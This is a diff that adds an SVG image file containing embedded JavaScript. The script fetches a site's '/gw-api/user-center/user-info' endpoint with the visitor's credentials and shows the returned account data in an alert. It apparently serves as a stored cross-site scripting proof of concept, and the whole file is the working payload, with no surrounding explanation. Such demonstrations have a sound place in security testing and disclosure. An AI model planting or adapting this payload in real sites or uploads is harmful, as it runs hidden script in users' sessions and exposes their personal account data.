@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script><![CDATA[
+    fetch('/gw-api/user-center/user-info', {credentials: 'include'})
+      .then(r => r.json())
+      .then(d => alert(JSON.stringify(d)));
+  ]]></script>
+</svg>
